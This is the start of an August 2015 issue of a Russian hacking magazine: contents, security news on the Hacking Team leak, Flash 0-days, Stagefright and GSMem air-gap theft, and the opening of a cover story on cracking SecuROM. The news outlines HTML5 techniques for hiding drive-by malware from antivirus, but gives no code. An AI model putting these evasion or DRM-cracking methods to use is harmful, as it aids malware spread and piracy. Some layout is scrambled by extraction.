                                               Август 2015


            №199

                                            Расшифровка
Javascript как                                     TLS трафика
ассемблер                                      приложений
для веба                                               на Java





                                                      Cover
                                                            Story
  КАК ВЗЛОМАЛИ
    SECUROM
         ИСТОРИЯ ПОРАЖЕНИЯ
        САМОЙ МОЩНОЙ DRM
        Проходим все этапы реверсинга головоломной
                 защиты компакт-дисков
                                                  август 2015
          № 199





  MEGANEWS
Все новое за последний месяц

  КАК ВЗЛОМАЛИ SECUROM
История поражения самой мощной DRM

  САМЫЙ БЫСТРЫЙ UI
Подборка полезных инструментов для веб-мастеров

  МАШИННЫЙ КОД ДЛЯ ИНТЕРНЕТА
Как Javascript превращается в подобие ассемблера

  ЖЕЛЕЗНАЯ НАДЕЖНОСТЬ
Как найти и устранить аппаратные проблемы с набором бесплатных утилит

  ИСКУССТВЕННАЯ ТУПОСТЬ
Даже роботам иногда лучше меньше думать и больше действовать

  ВСЕГДА НА СВЯЗИ
20 советов, которые позволят твоему iДевайсу прожить дольше

  ГОТОВИМ ЯБЛОКИ ПРАВИЛЬНО
Семь трюков, о которых должен знать каждый пользователь iДевайса

  ТЕПЛОЕ И МЯГКОЕ
Колонка Евгения Зобнина

  КАРМАННЫЙ СОФТ
Выпуск #10. И вновь Jailbreak

  EASY HACK
Хакерские секреты простых вещей

  ОБЗОР ЭКСПЛОЙТОВ
Анализ свеженьких уязвимостей

  PHDAYS V. РАПОРТУЕМ О БАГАХ.
Честный отчет об одной из самых известных конференций по IT безопасности в России

  В ПОИСКАХ АДМИНИСТРАТОРА
Колонка Юрия Гольцева

  ЛОГ ВСЕМОГУЩИЙ
Расшифровываем TLS-трафик с помощью JVM

  УКОЛЬЧИК КОДА
Играемся с Code Injection под Windows

  X-TOOLS
Cофт для взлома и безопасности

  УГРОЗЫ ДЛЯ СИСТЕМ ТРЕКИНГА ПОКАЗАТЕЛЕЙ ЗДОРОВЬЯ
Колонка Дениса Макрушина

  VOLATILE CEDAR В ВОПРОСАХ И ОТВЕТАХ
Новые подробности интересной восточной кампании кибершпионажа

  КОДИНГ ДЛЯ ПЕНТЕСТЕРА
Разрабатываем модули для Metasploit

  ПРОФИЛИРОВЩИКИ ДЛЯ PYTHON
Измеряем скорость выполнения наших приложений

  XONIX ДЛЯ ANDROID
Сделано стандартными средствами Android SDK!

  АНДРОИД КАК СРЕДСТВО НАБЛЮДЕНИЯ
Следим за происходящим вокруг, не беспокоя владельца телефона

  ЗАДАЧИ НА СОБЕСЕДОВАНИЯХ
Тестовые задания в gamedev, часть 2

  СБОРНАЯ СОЛЯНКА
Топ-10 необычных Linux-дистрибутивов, которыми ты вряд ли воспользуешься

  МЕНЯЕМ ГЛАВНОГО
Переходим с Windows 2003/2008 на Linux Samba

  ПЕС С ГОЛОВОЙ ДРАКОНА
Первый взгляд на ОС Node9, преемницу Plan 9 и Inferno

  ХРАНИТЕЛИ СЕТИ
Open-source утилиты для мониторинга и бэкапа настроек сетевого оборудования

  FAQ
Вопросы и ответы

 WWW
Удобные веб-сервисы

  ТИТРЫ
Кто делает этот журнал
                         Мария «Mifrill» Нефедова                             Анатолий
                                 nefedova.maria@gameland.ru                           Ализар





                                                         Новость
                                                      месяцаРАЗРАБОТЧИКА
ШПИОНСКОГО
СОФТА
ВЗЛОМАЛИ
            деятельности Hacking Team известно давно. Компанию основа-
            ли двое итальянских программистов, создателей свободной про-
           граммы Ettercap для MitM-атак. Фирма продаёт шпионский софт
            и инструменты для взлома спецслужбам и полиции по всему миру,
             в том числе в России (публиковались даже отчеты с перечислени-
 ем того, что конкретно они продают). До последнего времени члены HackingО
 Team чувствовали себя неприкасаемыми, находясь под защитой влиятельных
 «друзей» и партнёров, но сейчас хакеры всё-таки добрались до этих бизнес-
 менов: после взлома корпоративной сети в интернет выложены 400 Гбайт вну-
 тренних файлов, исходного кода и почтовой переписки.
    Эффект от взлома Hacking Team был мгновенный. Сразу после публикации
 документов в воскресенье вечером 5 июля 2015 года компания не только пре-
 кратила продажи, но и рекомендовала всем клиентам приостановить использо-
 вание шпионских программ собственной разработки. На сайте было размеще-
 но объявление о найме новых сотрудников.
    Проблема очень серьезная. Мало того, что «утекший» исходный код шпион-
 ских программ позволяет жертвам слежки обнаружить их — вдобавок с серве-
 ров компании получен точный и полный список клиентов. Теперь госслужбы не
 могут отрицать свою причастность.
    После недельного молчания представители Hacking Team решили пообщать-
 ся с прессой. Исполнительный директор компании Давид Винченцетти (David
  Vincenzetti) дал интервью итальянскому изданию La Stampa, где попытался хоть
 немного обелить компанию в глазах общественности. В интервью Винченцетти
  заявил, что Hacking Team, с 2003 года поставляющая правительствам, спец-
 службам и частным компаниям шпионский софт и инструменты для взлома, на
 самом деле всю дорогу играет на стороне добра.
    Однако, согласно попавшим в сеть бумагам, Hacking Team сотрудничала,
  к примеру, с Ливией, Суданом, Эфиопией, Гондурасом и другими странами с
 тоталитарными режимами, что упорно отрицала все эти годы (перечисленные
 страны, в частности, известны тем, что преследуют, пытают и убивают журнали-
  стов, несогласных с политикой правительства). В случае с Суданом, Эфиопией
 и Ливией Винченцетти признал, что деловые отношения действительно имели
 место, но с оговорками. Египет и Марокко так же являлись клиентами компании,
 а вот любые сношения с Сирией глава Hacking Team категорически отрицает. В
 целом, закрывая эту тему, директор Hacking Team заметил: «Геополитическая
 картина меняется и развивается очень быстро, возникают самые разные ситу-
 ации. Мы не торгуем оружием и не продаем оружие, которое может использо-
 ваться годами. Мы — хорошие парни».
    Относительно самой атаки Винченцетти заметил, что подобная акция «воз-
 можна только на государственном уровне, с применением мощных ресурсов,
 и явно должна была планироваться месяцами». С этим согласен и директор по
 маркетингу Hacking Team Эрик Рабе, пообщавшийся с изданием ZDNet. Рабе
 говорил, что атака была «невероятной сложной и ее осуществил явно не про-
 стой одиночка из-за какого-нибудь подвала».
    Rook Security уже выпустила инструмент Milano, который позволит каждо-
 му убедиться, что он не стал случайной жертвой. Она совершенно бесплат-
 на и ориентирована прицельно на поиск уязвимостей, сопряженных с Hacking
 Team. Milano может выполнить поверхностное или глубокое сканирование си-
 стемы. Специалисты Rook Security перебирают 400-гигабайтный архив Hacking
 Team вручную, используя динамический и статический анализ. Свои изыскания
 они также сопоставляют с данными VirusTotal, Kaspersky Whitelisting и PaloAlto
  Firewalls Wildfire. Если Milano обнаружит на машине пользователя подозритель-
 ные файлы, создатели утилиты крайне рекомендуют, считать данную машину
 скомпрометированной, так как осечки маловероятны.
    Уже найдены руткит, способный пережить даже смену HDD, Android-прило-
 жение, различные эксплоиты и другая малварь авторства Hacking Team. Экс-
 перты компании FireEye выявили эксплоиты для 0day уязвимостей в Adobe Flash,
 которые Hacking Team использовали в Японии для атак на местные компании.
 Вдобавок выясняется, что Hacking Team использовали и наработки сторонних
 разработчиков без их ведома. Все это не очень-то сочетается с образом «хо-
 роших парней».




                      «Сегодня ключевой вопрос для
                       всего человечества заключает-
                       ся в том, хотим ли мы начать гло-
                      бальную гонку ИИ вооружений или
                      хотим предотвратить самое ее
                        начало. Если основные военные
                     державы сейчас начнут продви-
                         гаться вперед, стремясь к соз-
                    данию оружия с искусственным
                        интеллектом, глобальная гонка во-
                      оружений практически неизбежна.
                      Конечная точка такой технологиче-
                       ской траектории очевидна: авто-
                     номное оружие станет автоматом
                      Калашникова завтрашнего дня»
                      Из открытого письма Future of Life Institute, подписанного
                                       Стивеном Хокингом, Илоном Маском и Стивеном Возняком





 Новая уязвимость в OpenSSH      Google задействует нейросети
 позволяет осуществлять          для борьбы со спамом
 брутфорс-атаки                   Google похвасталась результатами на
 Некто KingCope обнаружил серьез-    поприще борьбы со спамом: теперь
 ную уязвимость в OpenSSH. Баг по-    менее 0,1% нежелательных писем
 зволяет отключить систему ограни-    попадает в папку «Входящие» в Gmail,
 чения интенсивности запросов на     и лишь 0,5% попадают в папку «Спам»
 аутентификацию, что открывает злоу-   по ошибке. Таких результатов специ-
 мышленникам широкие возможности   алисты Google смогли добиться
 для брутфорса. Уязвимости присво-    благодаря использованию глубоких
 ен идентификатор CVE-2015-5600,     нейросетей. По официальным дан-
 патч для ее устранения уже написан    ным, нейросети сети Google могут
 и крайне рекомендован к установке.    похвастаться миллиардом связей,
 Скачать его пока можно вручную или    в то время как обычно они имеют от
 дождаться официального обновления  одного до десяти миллионов связей.
 OpenSSH.





 Китай заблокировал Telegram     Переименовав устройство Apple,
 Китайские власти обратили внимание  можно взломать App Store
 на мессенджер Telegram и заблоки-    Компания Vulnerability Lab обнару-
 ровали его. Повод для блокировки     жила критическую уязвимость в App
 политический: «Защитники прав че-     Store и iTunes. Когда пользователь
 ловека с помощью сервиса коорди-    совершает покупку, бекенд обраба-
 нировали атаки на Коммунистическую  тывает некоторые данные его устрой-
 партию и правительство страны», —     ства, чтобы сгенерировать инвойс.
 пишет газета People’s Daily. По ин-     Если переименовать устройство,
 формации гонконгского сайта Hong    поместив скриптованный код вместо
 Kong Free Press, сервис Telegram ис-   имени, он будет выполнен. Среди
 пользовался рядом репрессирован-    рисков: взлом сессий пользователей,
 ных юристов по защите прав человека  исполнение длительных фишинговых
 в стране для координации действий.    атак и перенаправление пользовате-
                                    лей на сторонние ресурсы.





ВЗЛЕТ И ПАДЕНИЕ
PROXYHAM
          нонимность в интернете важна не только преступникам, как ошибоч-
          но полагают многие, но и честным гражданам, в числе которых журна-
           листы, активисты, пользователи из стран с диктаторскими режимами
          и так далее. Конечно, в наши дни существуют Tor, VPN, различные
          способы шифрования, но порой и этого недостаточно. Бенджамин
 Каудил (Benjamin Caudill), основатель Rhino Security Labs, обещал показатьА
 устройство Proxyham, которое позволит подключаться к открытым беспрово-
 дным сетям, находясь за километры от них, и при этом оставаться анонимным.
    Proxyham создавался на базе Raspberry Pi, Wi-Fi карточки производства
  Ubiquiti Networks стоимостью $125 и трех антенн. В принципе, в такой конструк-
 ции нет ничего сложного: антенна Wi-Fi подсоединяется к открытой сети в лю-
 бом ресторане, библиотеке или где-то еще, оставшиеся две антенны работают
 на частоте 900 МГц. Они отвечают за передачу данных между пользователем
 и открытой сетью. Пользователь при этом может находиться в четырех кило-
 метрах от устройства: ему понадобится всего одна антенна, работающая на
 частоте 900 МГц и подключенная в порт Ethernet. В худшем случае, даже если
 пользователя вычислят, известен станет лишь IP-адрес Proxyham.
    Каудил планировал опубликовать все чертежи, исходные коды и специфика-
 ции устройства и наладить продажу Proxyham по цене $200. Однако самопаль-
 ному маршрутизатору не суждено было увидеть свет: через неделю создатель
 этого уникального устройства неожиданно объявил о прекращении дальней-
 шей разработки. Бен также добавил, что не будет выкладывать в открытый до-
  ступ схему аппаратной конструкции и программное обеспечение и уничтожил
 все выпущенные до сих пор устройства.
    Это решение породило ряд спекуляций о его причине. Предполагают, что
 на Каудилла надавили представители государственных структур. Из других вер-
 сий — опасения в нарушении прав интеллектуальной собственности. Есть так-
 же вариант, что Каудилл просто не смог сконструировать прибор с заявленны-
 ми техническими характеристиками, а сейчас выдаёт свой профессиональный
 «фейл» за некое загадочное явление.
    Однако существуют альтернативные варианты устройства. Один из них,
  ProxyGambit, чуть дороже (в районе $235), но ловит сигнал на расстоянии до
 десяти километров в пределах прямой видимости. На таком расстоянии воз-
 можна установка соединения на скорости 150 Мбит/с. ProxyGambit одновре-
 менно прокидывает прокси-соединение через окружающие локальные сети
  Wi-Fi, чтобы еще больше замаскировать реальное местоположение пользова-
  теля, его IP-адрес и личность.





    Другой альтернативный вариант предложил Роберт Грэхем из компании
  Errata Security. Он предлагает просто заказать в интернет-магазине два ре-
 транслятора locoM9 по $125 и два маршрутизатора Wi-Fi вроде TL-WR700N по
 $20. Первый маршрутизатор переводится в клиентский режим и подключается
  к открытом хотспоту. К нему подключается ноутбук по Ethernet, а два ретранс-
 лятора locoM9 устанавливаются в режиме прозрачного моста. В конце концов,
 ко второму ретранслятору подключается второй маршрутизатор. Он будет ра-
 ботать в обычном режиме, но на расстоянии в несколько километров от места
 подключения к интернету.





ADOBE FLASH
ДОЛЖЕН УМЕРЕТЬ
            разу несколько антивирусных компаний сообщили об обнаружении
            опасной, работающей 0day-уязвимости в Adobe Flash Player. Ана-
            литики Trend Micro сообщают, что обнаружили «по меньше мере три
            эксплоита». Один эксплоит, к примеру, работал с уязвимостью CVE-
            2015-0349, для которой в апреле уже вышел патч.
    Другим обнаруженным багом специалисты Hacking Team явно очень гор-С
 дились, и поэтично описали его как «самый прекрасный баг Flash за послед-
 ние четыре года, со времен CVE-2010-2161». Уязвимость работает в Windows
 и SELinux и действительно опасна, так как позволяет исполнить на удаленном
 компьютере произвольный код — в этом сходятся специалисты Symantec, Trend
  Micro и Eset. Багу подвержены буквально все браузеры: Google Chrome, Opera,
  Safari, Internet Explorer и даже Edge. В архиве, помимо proof-of-concept вариан-
  та, который может запустить калькулятор в Windows, содержался и рабочий, на-
 стоящий эксплоит, который уже гуляет по сети. Эксплоит использует use-after-
  free уязвимость в объекте ByteArray. Антивирусные компании рекомендуют всем
 пользователям временно отключить Flash в браузерах.
    Новый директор по безопасности Facebook, известный хакер Алекс Стамос,
 вообще призвал корпорацию Adobe прекратить дальнейшую разработку про-
  екта Flash, навсегда закрыть это направление и забыть его как страшный сон.
 Независимо от решения Adobe, Стамос порекомендовал пользователям отка-
  заться от использования «дырявой» технологии.
   В своём твиттере Стамос написал: «Пришло время Adobe назначить дату
 окончания жизненного цикла Flash и попросить разработчиков браузеров уста-
 новить дату окончания поддержки на тот же день». В последующих твитах Стамос
 высказал мнение, что организации используют Flash по привычке. Это проще,
 чем переписывать приложения с нуля, обеспечивая поддержку открытых стан-
 дартов HTML5. «Даже если дата будет установлена через полтора года, факт её
 установки — это единственный способ выпутаться из зависимости и обновить
 всю экосистему одновременно», — пишет Стамос.
    Мнение Стамоса поддерживает и фонд Mozilla, который с 13 июля 2015 года
 по умолчанию заблокировал все версии Flash Player в браузере Firefox.
   В настоящее время Flash используется во многих популярных играх на
 Facebook, в части видеороликов на Youtube и в бесчисленном количестве
 веб-приложений. Такую глыбу тяжело будет уничтожить, считают эксперты. Как
 показали последние годы, даже всеобщая ненависть к этой технологии не по-
 зволяет полностью вывести её из обращения.





GOOGLE ПРОТИВ
ТОРРЕНТОВ
        орпорация Google борется с пиратами не только открыто, но и тихо,
         по-своему. Один  из популярнейший  торрент-трекеров  сети —
          KickassTorrents (KAT), ежедневно привлекающий миллионы посетите-
          лей, хорошо ощущает давление поисковика на себе, о чем представи-
         тели трекера рассказали изданию TorrentFreak.
    KAT за последние месяцы неоднократно менял домены, равно как и незаб-К
 венный The Pirate Bay. Но с каждой сменой домена пользователям становится
 все труднее снова отыскать сайт, потому как простой набор в поисковой строке
 Google запроса «KickassTorrents» уже ни к чему не приводит. В данный момент
 сайт располагается по адресу KAT.cr, но ничего похожего наверху поисковой
 выдачи нет. Вместо этого Google предлагает посетить некий Kickasstorrents.eu.
 Сайт является фейковой копией KAT и попросту распространяет малварь.
    Настоящий KAT «тонет» в поисковой выдаче, опускаясь все ниже и ниже. За
  что Google раз за разом применяет к трекеру пенальти, не понимают даже сами
 его администраторы. По их словам, такая ситуация наблюдается уже несколько
 месяцев, и единственное, что могло бы послужить поводом для такого поведе-
 ния поисковика – некое «нечестное» SEO. Но никаких работ по поисковой опти-
 мизации сайта администрация KAT не проводила уже очень давно.
    Создатели трекера лишь разводят руками и рекомендуют пользователям
 заглядывать в официальные Facebook и Twitter, чтобы узнать новое доменное
 имя KickassTorrents. Также можно пользоваться менее предвзятыми поисковы-
 ми машинами. К примеру, у DuckDuckGo никаких проблем с KAT нет — он даже
 помечает текущий домен как «официальный сайт».
    Трения с Google возникли и у популярного приложения uTorrent. Google на-
 чал блокировать некоторые страницы официального сайта uTorrent (притом не
 постоянно, а в отдельных случаях). К примеру, при попытке скачать последнюю
 версию стабильного релиза uTorrent, Chrome часто блокирует закачку, помечая
 программу, как малварь. Похожая ситуация наблюдается с другими продуктами
  BitTorrent и страницами сайта. Google уверяет, что они содержат «вредоносные
 программы», но очевидно, сайт uTorrent не мог быть помечен вредоносным слу-
 чайно — это было сделано преднамеренно и вручную.
    Представитель Google пояснил изданию TorrnetFreak, что компания дей-
 ствительно усилила борьбу с программами, которые привносят «неожиданные
 изменения» на компьютеры пользователей. Странное поведение браузера –
  результат именно этих улучшений. Вероятно, Google не понравился контекст-
 ный рекламный модуль OpenCandy, встроенный в последние версии uTorrent по
 умолчанию.




 ЗА ГОД РЫНОК ПК СОКРАТИЛСЯ НА 9,5–11,8%

     Аналитические компании Gartner и IDC опубликовали отчеты о состоянии рынка ПК во вто-
 ром квартале 2015 года. Данные аналитиков немного разнятся, но они сходятся в одном — по-
  ставки и продажи персональных компьютеров продолжают снижаться.

    За второй              IDC:                                Gartner:
     квартал 2015
    было отгружено ПК
                     млн             млн      66,1   68,4
                         на 11,8% хуже                   на 9,5% хуже
                        прошлого года                  прошлого года


  Лидеры рынка
  Lenovo:                 HP:                           Dell:                       Apple:

        млн ПК,                млн ПК,              млн ПК,               млн ПК, 13,4          12,2         9,5            5,1
  в прошлом году           в прошлом году           в прошлом году           в прошлом году
  14,4 млн                 13,6 млн                 10,4 млн                  4,4 млн
ЗЛОВРЕДЫ
РАСПРОСТРАНЯЮТСЯ
СРЕДСТВАМИ HTML5
        руппа итальянских исследователей предложила три новые техники об-
        фускации, способные обмануть антивирусные сканеры и успешно рас-
        пространять вредоносные программы методом drive-by. Техники осно-
        ваны на новых стандартах HTML5, объясняют авторы научной работы.
       По их мнению, увеличение количества малвари в Сети объясняется
 именно внедрением новых веб-технологий.Г
    Для обфускации используются некоторые программные интерфейсы HTML5,
  хотя принципиальная схема drive-by остается прежней. На предварительном
 этапе происходит шифрование зловреда и его размещение на сервере. Как
 только жертва загружает зараженную страницу, то одновременно скачивает
 вредоносную программу, которая дешифруется и запускается на исполнение.
    Первый этап остался неизменным: злоумышленник ищет подходящий «ды-
 рявый» сервер и проводит инъекцию кода. Второй этап гораздо интереснее.
 Для доставки зловреда и дешифровки применяются программные интерфейсы
 HTML5. Именно это позволяет обойти антивирусы, которым пока незнакомы
 подобные методы.
   В научной работе исследователи описывают три инновационных метода об-
 мана антивирусов. Дело в том, что многие антивирусные системы отслежива-
 ют стандартные процедуры декодирования или деобфускации. Есть несколько
 способов избежать обнаружения.
 •  Делегированная подготовка (Delegated Preparation): зловред разбивается
    на фрагменты в «базе данных», а деобфускация перекладывается на брау-
    зер с помощью Web-SQL API или IndexeDB API.
 •  Распределенная подготовка (Distributed Preparation): обычно процедуры
    деобфускации выглядят безобидно по отдельности, но подозрительно все
    вместе. Это их свойство используется при распределенной деобфускации,
    когда зловред разбивается на фрагменты, и они расшифровываются в раз-
    ных контекстах.
 •  Деобфускация пользователем  (User-driven  Preparation): разновидность
    распределенной подготовки, когда расшифровка и исполнение програм-
   мы размазаны по времени, которое пользователь проводит на зараженной
    веб-странице. Для внесения элемента случайности действия зловреда ини-
    циируются непосредственно действиями пользователя, не подозревающим
    об этом.

 Эксперимент показал, что такая тактика позволяет обмануть большинство си-
 стем обнаружения и антивирусных сканеров. Исследователи призывают раз-
 работчиков защитных систем модернизировать свои программы с учетом воз-
 можностей HTML5.





УЧЕНЫЕ
ДЕМОНСТРИРУЮТ
ПЕРЕХВАТ ДАННЫХ
ПРИ ПОМОЩИ
ПРОСТЕЙШИХ
МОБИЛЬНИКОВ
         ченые из израильского Исследовательского центра кибербезопасно-
          сти Университета Бен-Гуриона, известные как создатели Air Hopper,
         продемонстрировали новый метод извлечения данных с физически
         изолированных ПК. Если компьютер не подключен ни к каким сетям,
          украсть данные все равно можно. Понадобится старый сотовый теле-
 фон и крохотная программа GSMem для Windows и Linux.У
    Команда ученых под руководством Мордекая Гури (Mordechai Guri) обеща-
 ла продемонстрировать на конференции USENIX Security Symposium методику,
 которая позволяет похищать данные даже с изолированных от любых внешний
 воздействий ПК, притом атакующему не понадобится ничего, кроме небольшой
 программы.
    Эксперты создали программу GSMem, которая является proof-of-concept
 малварью и отсылает данные с зараженного компьютера на GSM-частотах на
 мобильный телефон.
   GSMem, по сути, изменяет прошивку мультиканальной памяти, заставляя ее
 передавать данные наружу в виде электромагнитных сигналов. Конечно, много
 таким способом не украдешь, но короткие фрагменты данных вроде паролей
 и ключей шифрования утянуть вполне возможно. Ученые отмечают, что лучше
 всего этот трюк работает с четырехканальной памятью RAM.
    Приемником выступает сотовый телефон, причем подойдут самые древние
 модели. Исследователи проводили тесты с Motorola C123, в котором нет ниче-
  го — ни камеры, ни Wi-Fi, ни Bluetooth. На момент испытаний в телефоне даже
 не была установлена SIM-карта. Пронести такой гаджет на закрытое предприя-
 тие определенно возможно.
    Обычный телефон будет принимать сигналы с зараженного компьютера на
 расстоянии 1-1,5 метров. Если же телефон модифицировать, установив более
 мощный аппаратный ресивер, эту зону можно расширить до тридцати метров.
    Смартфон на Android, снабженный специальным приложением, тоже может
 принимать такие сигналы, но на дистанции десять сантиметров, что делает при-
 менение смартфонов не слишком рациональным.
    На резонный вопрос о том, как защититься от атак подобного рода, исследо-
 ватели отвечают, что нужно лучше контролировать зоны вокруг важных компью-
  теров. Нельзя подпускать к ним людей с какими угодно гаджетами, а также стоит
 подумать об экранировании стен помещений.




                    «В тюрьме было не так уж плохо. Опре-
                    деленно стоило отсидеть срок за The
                           Pirate Bay, учитывая сколько этот сайт
                      значит для многих людей. Мои представ-
                     ления о тюрьмах складывались по аме-
                      риканских фильмам. Теперь у меня есть
                    личный опыт, и я рад сообщить, что на
                   самом деле все обстоит немного иначе.
                 В отличие от фильмов, у меня не было
                     двухместной зарешеченной камеры.
                    У меня была собственная десятиметро-
                      вая комната с обычной дверью, а реше-
                       ток не было даже на окнах. Как на круиз-
                   ном лайнере, только вид паршивый»

                                                                              Фредрик Нейдж,
                                       бывший администратор и сооснователь
                                             The Pirate Bay в интервью TorrnetFreak

950 МЛН УСТРОЙСТВ
НА ANDROID
ПОДВЕРЖЕНЫ
НОВОЙ
УЯЗВИМОСТИ
          а конференции Black Hat, которая состоится в начале августа
           в Лас-Вегасе, обещают обнародовать подробности о новом, опас-
         ном баге в Android ОС. Специалисты компании Zimperium Mobile
             Security утверждают, что нашли способ взламывать устройства под
          управлением Android, просто отправляя на них MMS.
    Уязвимости, получившей имя Stagefright, в общей сложности подверженыН
 порядка миллиарда устройств во всем мире, так как она затрагивает устройства
 начиная с Android 2.2 и выше. Пока подробностей немного, авторы находки бе-
  регут их для доклада на Black Hat. Тем не менее, известно, что баг обнаружился
 в коде Android Open Source Project (AOSP), а точнее в библиотеке Stagefright
 (давшей имя уязвимости). Она отвечает за обработку ряда медиа-форматов.
 В частности, проблема кроется в обработке видео и контента из MMS.
   По словам экспертов Zimperium Mobile Security, эксплуатацию этой уязвимо-
 сти можно произвести вообще без ведома пользователя. Достаточно прислать
 ему составленное определенным образом сообщение по MMS, которое поль-
 зователь может даже не открывать. Устройство все равно, самостоятельно ис-
 полнит присланный код, а сообщение может самоликвидироваться еще до того,
  как пользователь вообще его заметит. Хакеры, в освою очередь, могут получить
 доступ к камере, микрофону, памяти, и делать в системе, что захотят.
    Однако в данном случае страшна не только сама уязвимость, которую по
 масштабности можно сравнить с Heartbleed. Страшно, что ситуация с обновле-
 нием Android весьма и весьма печальна. Дело в том, что команда Google сра-
 ботала оперативно. Как только Zimperium Mobile Security сообщили о проблеме,
 в течение 48 часов были выпущены патчи, закрывающие данный баг. Но когда
 эти заплатки дойдут до конечных пользователей и дойдут ли вообще – большой
 вопрос. Выпуск обновлений (в том числе и критических) ложится на плечи про-
 изводителей устройств, а им порой требуются месяцы, чтобы выпустить даже
 самый экстренный патч.
    Представители Zimperium Mobile Security замечают, что устройства старше
 18 месяцев скорее всего вообще не получат никаких обновлений, а появление
 эксплоитов — лишь вопрос времени.
    Исследователи сообщают, что наиболее серьезная угроза нависла над
 устройствами, которые работают под управлением Android младше версии Jelly
 Bean (4.3), а это порядка 11% всех Android-девайсов в мире. На них попросту
 нет никаких механизмов защиты, которые препятствовали бы атакам такого
 рода, они появились в более поздних версиях ОС. Однако по причине отсут-
 ствия или очень медленного выхода обновлений, под угрозой находится 95%
 всех Android-устройств, вне зависимости от версии ОС.





 Samsung будет        Игра, которая умеща-  Китай снял запрет на
 делать мониторы со    ется в один твит       приставки, дливший-
 встроенной беспро-    Код игры Tiny Twitch      ся 15 лет
 водной зарядкой       умещается в один твит,  С 2000 года в Китае
 Корейский промышлен-   то есть в 140 символов.   была запрещена прода-
 ный гигант объявил о     Написал ее Алекс Йо-    жа игровых приставок.
 скором начале произ-    дер на спор, переписы-   Тогда власти страны
 водства мониторов со    ваясь с друзьями через   сочли, что компьютер-
 встроенной зарядкой       Twitter. Игра простец-    ные игры оказывают
 стандарта Qi Wireles.       кая: в окне браузера      негативный эффект на
 Они будут иметь диаго-   нужно кликать на символ  психику и развитие де-
 нали 23,6 и 27 дюймов.    «X», который появляется   тей. Теперь запрет на
 Зарядная станция инте-   в произвольных местах.   продажу приставок сни-
 грирована в подставки    Промахиваться нель-     мут на территории всей
 мониторов и не видна,    зя — это моментальный   страны. Теперь перед
 если не знать о ней.      проигрыш. Не особен-    Sony, Microsoft, Nintendo
 Цены и даты выхода      но весело, но приятно    и другими производи-
 новых моделей пока что   знать, что искусство tiny   телями встает нелегкая
 не объявлены. Помимо   сodе ещё не оконча-     задача интеграции в
 Samsung телефоны с     тельно вымерло в наш    этот закрытый на протя-
 поддержкой Qi выпу-      век широкополосного    жении последних 15 лет
 скают такие компании    интернета и терабайт-    рынок, привыкший к ПК
  как Asus, HTC, Huawei,    ных жестких дисков.      и мобильным играм.
 LG Electronics, Motorola,
 Nokia и Sony.

УСЛУГИ ЛИЧНОГО
ШПИОНА В
ДАРКНЕТЕ СТОЯТ
ДОРОГО
        омпания SurfWatch Labs представила новую услугу, призванную помочь
         предприятиям сориентироваться в непонятном мире неиндексируе-
        мых сетей. Сервис совсем недешевый – за возможность держать руку
         на пульсе сетевого андеграунда клиентам придется выложить порядка
        $100 000 в год (в стоимость также входят SurfWatch C-Suite и Cyber
  Risk Cloud).К
    На сегодняшний день даркнет для большинства людей (и компаний) — не-
  что непонятное и страшное. Место, которое, по их мнению, кишит педофилами,
 наркоторговцами, киллерами и хакерами. На самом деле, все не совсем мрач-
  но: даркнет посещают не только преступники, но также журналисты, активисты,
 простые пользователи из стран, где практически весь интернет закрыт и запре-
 щен на государственном уровне. Но и отрицать тот факт, что в даркнете немало
 мест, где собираются киберпреступники и циркулируют ворованные и опасные
 данные, тоже нельзя. Именно это «слепое пятно» может стать проблемой для
 многих компаний, считают специалисты SurfWatch Labs.
   По сути, SurfWatch Labs, основанная в 2013 году бывшим аналитиком разве-
 дывательной службы США, хочет занять пока свободную на рынке нишу. Новая
  услуга получила название «Персональный разведывательный даркнет-сервис»
  (Personalized Dark Web Intelligence Service). Краеугольный камень, на котором
 строится сервис — управление рисками, то есть предоставление компаниям
 глубокого анализа и исследований на тему возможных рисков, связанных для
 них с даркнетом.
    Специалисты SurfWatch Labs берутся узнать, не ищет ли кто-то наемных ха-
  керов, спамеров или фишеров для атаки на компанию, не продают ли на черном
 рынке информацию об уязвимостях, украденную интеллектуальную собствен-
 ность или личные данные сотрудников компании. Также аналитики SurfWatch
 Labs присмотрят за форумами хактивистов, на которых те выбирают цели для
 новых атак, изучат присутствующие на черном рынке экплоиты и убедятся, что
 ничто не угрожает компании изнутри.
    «Традиционная киберразведка не в состоянии предоставить организациям
 данные о том, какая именно конфиденциальная информация была украдена,
 и как ее используют или перепродают в даркнете. Наш персонализированный
 сервис киберразведки позволит компаниям лучше оценить риски, которые не-
 сет им даркнет и еще более темные уголки сети», — рассказал Джейсон Пола-
  нич, основатель и главный архитектор SurfWatch Labs.




 РЕЙТИНГ АНТИВИРУСОВ ДЛЯ WINDOWS

     Согласно последним данным из Магдебурга (Германия), пришедшим от лаборатории AV-
  Test, Windows Defender лучше не использовать в качестве единственного антивирусного реше-
  ния. Программа Microsoft показала худший результат среди 21 продукта.

 Лучшие и худшие антивирусы за июнь 2015 года:
 18 из 18 баллов   17,5 из 18 баллов   12 из 18 баллов   9,5 из 18 баллов
  Avira, Bitdefender   McAfee, Norton      ThreatTrack       Аутсайдер —
 и Kaspersky       и Trend Micro                       Windows Defender

  Результаты
 Windows
  Defender:

              Защитит от                   Опознает     85%   95%              малвари (у лидера 98%)         0day (у лидера 99%)
Coverstory





                                                                                      ELF





 КАК ВЗЛОМАЛИ
   SECUROM
        ИСТОРИЯ ПОРАЖЕНИЯ
       САМОЙ МОЩНОЙ DRM
       Проходим все этапы реверсинга головоломной
                защиты компакт-дисков





Отчет о недавних удивительных приключениях
русских хакеров в недрах самой известной и узнава-
емой DRM в мире. Все секреты торжества хакерской
мысли в итоговой статье человека, который приложил
к этому руку.

Далекий 1998 год. В компьютерный мир ворвалась новая защита от пиратства,
которая спустя некоторое время станет одной из самых узнаваемых и извест-
ных DRM на свете. GTA IV, серия Command & Conquer, BioShock, The Witcher,
WarCraft III, FarCry 2, TestDrive Unlimited, Gothic 4, Spore, Sims, — вот лишь не-
полный список бестселлеров, чьи OEP и CRC от посягательства пиратов пы-
тался защитить автор SecuROM Рейнгард Блаукович. Он в поте лица работал
над своим творением на компанию Sony DADC. В 2014 году с SecuROM будет
связано одно из самых позорных и страшных поражений в истории DRM.

                                                             Рейнгард Блаукович
                                                               как бы играет в пинг-
                                                                понг с хакерами.
                                               И проигрывает!





КАК ВСЕ НАЧАЛОСЬ
За окном мирно падал снег, начинался 2015 год. Блуждая по просторам интер-
нета, я неожиданно для себя нашел на одном из хакерских форумов тему про
взлом SecuROM 7 — именно седьмая и восьмая версии стали наиболее «лю-
бимыми». Тема датировалась 2007 годом и, судя по всему, эта версия только
что появилась. В конце поста его автор сетовал на сложность защиты и гово-
